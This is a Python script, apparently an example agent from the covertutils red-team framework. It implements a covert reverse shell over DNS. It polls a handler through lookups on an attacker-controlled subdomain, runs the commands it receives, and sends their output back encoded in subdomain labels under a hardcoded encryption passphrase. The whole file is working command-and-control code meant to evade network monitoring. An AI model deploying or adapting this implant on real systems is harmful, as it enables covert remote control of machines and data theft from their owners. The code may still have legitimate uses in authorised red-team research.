#!/usr/bin/env python
#============================== Imports part =============================

from covertutils.handlers import InterrogatingHandler
from covertutils.handlers.impl import StandardShellHandler, ExtendableShellHandler
from covertutils.orchestration import  SimpleOrchestrator

from os import urandom
from time import sleep
import sys
import socket
try :
	import Queue as queue
except :
	import queue



#============================== Handler Overriding part ===================

class ShellHandler ( InterrogatingHandler, StandardShellHandler ) :

	def __init__( self, recv, send, orch ) :
		super( ShellHandler, self ).__init__( recv, send, orch, # basic handler arguments
											fetch_stream = 'control',	# argument from 'InterrogatingHandler'
											stage_stream = 'stage',
											delay_between = (0.0, 3),	 # argument from 'InterrogatingHandler'
											)	# The arguments will find their corresponding class and update the default values

	def onChunk( self, stream, message ) : print "Chunk!"		# If a part of a message arrives - do nothing.

	def onMessage( self, stream, message ) :		# If a message arrives

		if message != 'X' :								# If message is not the 'no data available' flag :
			output = super(ShellHandler, self).onMessage( stream, message )	# Run the received message
																				#through the corresponding function
			print output
			print( "[+] Command Run - generated %d bytes of output!" % len(bytes(output)) )
			self.queueSend( output, stream )			# Queue the output to send in next interval
		# pass

	def onNotRecognised( self ) : print( "[!] < Unrecognised >" )


#==========================================================================


#============================== Networking part ===========================

# The subdomain whose authoritative DNS is the Handler Host
base_domain = sys.argv[1] 	# called as 'python Client.py sub.securosophy.net
recv_queue = queue.Queue()


def encode_payload( data ) :
	'''
	"</SECRET>" becomes PFNFQ1JFVC8_Cg
	'''
	enc_data = data.encode('base64').replace("=", "").replace("/","-").replace("+","_").strip()
	return enc_data

def send( raw ) :
	enc = encode_payload( raw )
	payload = "%s.%s" % (enc, base_domain) # urandom(1).encode('hex')
	print payload
	try :
		# resp = socket.gethostbyname( payload )
		resp = socket.getaddrinfo(payload, 80)
		recv_queue.put(resp)
	except Exception as e:
		# print e
		print "Couldn't resolve", e

def recv( ) :
	global resp_queue
	resp = recv_queue.get()
	total_resp = ''
	# Parse both IPv4 and IPv6 addresses
	for x in resp :
		try :
			d = socket.inet_pton(socket.AF_INET6, x[4][0])
			total_resp += d
		except :
			d = socket.inet_pton(socket.AF_INET, x[4][0])
	recv_queue.task_done
	if not total_resp : total_resp = urandom(16)
	resp = None
	return total_resp[:16]

#==========================================================================


#=============================Handler Creation=============================

passphrase = "App1e5&0raNg3s"	# This is used to generate encryption keys

orch = SimpleOrchestrator( passphrase,
							reverse = False, 			# For 2 Orchestrator objects to be compatible one must have 'reverse = True'
							tag_length = 2,		# The tag length in bytes
							out_length = 35,	# The absolute output byte length (with tags)
							in_length = 16,		# The absolute input byte length (with tags)
							# streams = ['heartbeat'],	# Stream 'control' will be automatically added as failsafe mechanism
							)

handler = ShellHandler( recv, send, orch )

#==========================================================================

# Wait forever as all used threads are daemonized
while True : sleep(10)


#	Magic!
